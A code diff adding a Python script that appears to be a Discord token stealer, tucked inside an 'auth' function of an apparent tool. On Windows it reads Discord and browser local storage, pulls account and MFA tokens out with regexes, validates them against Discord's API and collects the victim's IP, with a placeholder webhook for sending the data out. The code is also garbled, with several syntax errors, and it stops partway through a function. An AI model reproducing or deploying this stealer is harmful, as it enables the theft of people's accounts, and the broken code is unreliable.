@@ -1,0 +1,75 @@
+import discord_webhook
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import random
+import threading
+import threading import Thread
+import string
+import urllib3
+urllib3.disable_warnings()
+import asyncio
+import colorama
+from colorama import Fore, Style, Black
+import time
+from time import sleep
+colorama.init()
+
+def auth():
+    WEBHOOK = "YOUR WEBHOOK URL"
+    def dastela():
+    import os
+    if os.name != "nt":
+        exit()
+    from re import findall
+    from json import loads, dumps
+    from base64 import b64decode
+    from subprocess import Popen, PIPE
+    from urllib.request import Request, urlopen
+    from datetime import datetime
+    from threading import Thread
+    from time import sleep
+    from sys import argv
+    LOCAL = os.getenv("LOCALAPPDATA")
+    ROAMING = os.getenv("APPDATA")
+    PATHS= {
+        "Discord"           : ROAMING + "\\Discord",
+        "Discord Canary"    : ROAMING + "\\discordcanary",
+        "Discord PTB"       : ROAMING + "\\discordptb",
+        "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+        "Opera"             : ROAMING + "\\Opera Software\\Opera Stable", 
+        "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+        "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    }
+    def getheaders(token=None, content_type="application/json"):
+        headers = {
+            "Content-Type": content-type,
+            "User-Agent": Mozilla/5.0 (X11, Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1217.64 Safari/537.11"
+            
+        }
+        if token: 
+            headers.update({"Authorization": token})
+        return headers
+        def getuserdata(token):
+        try:
+            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+        except:
+            pass
+    def gettokkens(path)
+        path += "\\Local Storage\\LevelLdb"
+        tokens = []
+        for file_name in os.listdir(path):
+            if not file endswith(".log") and not file_name.endsith(".ldb")
+                continue
+            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for token in findall(regex, line):
+                        tokens.append(token)
+        return tokens
+    def getip():
+        ip= "None"
+        try:
+            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        except: 
+            pass
+        return ip
+    def gethwid():
+     
